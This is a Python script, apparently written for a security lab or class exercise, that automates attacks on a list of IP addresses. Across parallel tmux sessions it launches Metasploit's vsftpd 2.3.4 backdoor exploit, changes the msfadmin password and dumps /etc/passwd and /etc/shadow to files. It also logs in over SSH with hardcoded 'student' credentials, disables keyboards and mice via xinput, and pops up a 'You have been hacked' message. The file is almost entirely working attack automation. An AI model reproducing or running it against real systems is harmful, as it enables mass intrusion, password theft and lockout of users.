# Created by Tapas Joshi
# Python script to read the file and get all IP addresses and store it in a list
# SSH to each and every IP address in different terminal

import os
import time
from os import system
import subprocess
import threading

user = "student"
passwd = "\"student\""
s_action = "enable"

bufferedList = []

def tmux(command):
    system('tmux %s' % command)


def tmux_shell(command, ses):
    # tmux('send-keys "%s" "C-m"' % command)
    tmux('send-keys -t ' + ses + ' "%s" "C-m"' % command)

with open("ip.txt") as f:
    content = f.readlines()
# Removes whitespace characters like `\n` at the end of each line
content = [x.strip() for x in content]


# tmux('new-window')
# tmux('select-window -t 0')
# tmux_shell('vim')

# os.system("gnome-terminal -e 'bash -c \"ps; exec bash\"'")
# os.system("tmux new -s "+"2"+" -d")
# os.system("tmux new-window cd /etc/")

def msf(task):
    # If any tmux server running, kill it
    os.system("tmux kill-server")
    for [index, ip] in enumerate(content):


        # Start a new tmux session
        os.system("tmux new -s " + str(index) + " -d &")
        # Attach the new tmux session with a new Terminator window
        os.system("gnome-terminal -e 'bash -c \"tmux attach -t " + str(index) + "; exec bash\"'&")
        # Run msf console
        tmux_shell('cd /opt/metasploit-framework/', str(index))
        tmux_shell('msfconsole', str(index))

        tmux_shell('use exploit/unix/ftp/vsftpd_234_backdoor', str(index))
        tmux_shell('set RHOST '+ip, str(index))
        tmux_shell('show options', str(index))

        # tmux('capture-pane')
        # stdoutdata = subprocess.getoutput("tmux show-buffer")
        # print("stdoutdata: " + stdoutdata)
        #tmux_shell('show options')
        tmux_shell('exploit', str(index))

        if task == "change_pass":
            tmux_shell('passwd msfadmin', str(index))
            tmux_shell('msfadmin', str(index))
            tmux_shell('msfadmin', str(index))

      #  if task == "get_pass":
       #      tmux_shell('cat /etc/passwd', str(index))

   #     if task == "get_shadow":
    #        tmux_shell('cat /etc/shadow', str(index))
        # print(subprocess.run(['tmux', 'show-buffer'], stdout=subprocess.PIPE).stdout.decode('utf-8'))

def savePass(type, t):
    time.sleep(0.5 + t)
    os.system("gnome-terminal -e 'bash -c \"tmux new -s " + str(t) + "; exec bash\"'&")
    # SSH to all the IP addresses
    time.sleep(1.5)

    tmux_shell('cd /opt/metasploit-framework/', str(t))
    tmux_shell('msfconsole', str(t))

    tmux_shell('use exploit/unix/ftp/vsftpd_234_backdoor', str(t))
    tmux_shell('set RHOST ' + content.__getitem__(t), str(t))
    tmux_shell('show options', str(t))
    tmux_shell('exploit', str(t))

    time.sleep(10)

    print("Wait Complete...Grabbing password files....")

    if type == "pass":
        tmux_shell('cat /etc/passwd', str(t))
        time.sleep(5)

        bufferedList.insert(t, subprocess.run(['tmux', 'show-buffer', '-b', str(t)], stdout=subprocess.PIPE).stdout.decode('utf-8'))

        # print("Buffered List Output -> " + str(i) + "==========>" + str(bufferedList.__getitem__(i)))

        if bufferedList.__getitem__(t).__contains__("Last login"):
            print("Root shell aquired for " + content.__getitem__(t) + " ")

        else:
            print("Exploit failed for " + content.__getitem__(t) + " ")

    if type == "shadow":
        tmux_shell('cat /etc/shadow', str(t))
        time.sleep(5)

        bufferedList.insert(t, subprocess.run(['tmux', 'show-buffer', '-b', str(t)], stdout=subprocess.PIPE).stdout.decode('utf-8'))
        tmux('save-buffer -b ' + str(t) + ' /home/profiler/NS/' + str(t) + "_" + type)

        # print("Buffered List Output -> " + str(i) + "==========>" + str(bufferedList.__getitem__(i)))

        if bufferedList.__getitem__(t).__contains__("Last login"):
            print("Root shell aquired for " + content.__getitem__(t) + " ")

        else:
            print("Exploit failed for " + content.__getitem__(t) + " ")









# Starts a loop to read ip addresses line by line and then opens ssh session to each IP
def dis_key(action, i):

    tmux_shell('export DISPLAY=:0', str(i))

    for x in range(0, 10):
        if action == "disable":
            tmux_shell('sleep 1; xinput set-prop ' + str(x) + ' \'Device Enabled\' 0', str(i))
            if x == 0:
                tmux_shell('xmessage -center You have been hacked by Group 7 &', str(i))
        elif action == "enable":
            tmux_shell('sleep 1; xinput set-prop ' + str(x) + ' \'Device Enabled\' 1 &', str(i))
            if x == 0:
                tmux_shell('xmessage -center Everything back normal &', str(i))

def dis_multithreaded(i):
    time.sleep(0.5 + i)
    os.system("gnome-terminal -e 'bash -c \"tmux new -s " + str(i) + "; exec bash\"'&")
    # SSH to all the IP addresses
    time.sleep(1.5)
    tmux_shell('sshpass -p ' + passwd + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + content.__getitem__(i), str(i))

    time.sleep(100.5)
    # ifconfig | grep 'inet addr' | cut -d: -f2 | awk '{print $1}'

    tmux('capture-pane -t ' + str(i) + ' -b ' + str(i))

    time.sleep(0.5)

    bufferedList.insert(i, subprocess.run(['tmux', 'show-buffer', '-b', str(i)], stdout=subprocess.PIPE).stdout.decode('utf-8'))

    #print("Buffered List Output -> " + str(i) + "==========>" + str(bufferedList.__getitem__(i)))

    if bufferedList.__getitem__(i).__contains__("Last login"):
        print("SSH to "+content.__getitem__(i)+" successful")
        dis_key("disable", i)

    else:
        print("SSH to " + content.__getitem__(i) + " failed")


def thread_m():
    tmux("kill-server")
    bufferedList.clear()
    threads = []
    for i in range(content.__len__()):
        t = threading.Thread(target=dis_multithreaded, args=(i,))
        threads.append(t)
        t.start()

def thread_pass():
    tmux("kill-server")
    #bufferedList.clear()
    threads = []
    for i in range(content.__len__()):
        t = threading.Thread(target=savePass, args=("pass", i,))
        threads.append(t)
        t.start()

thread_m()
#thread_pass()

# 192.168.16.128
#dis_key("disable")
#time.sleep(10)
#dis_key()

#msf("get_shadow")
#savePass("shadow", 2)
#msf("get_pass")
#savePass("pass", 2)

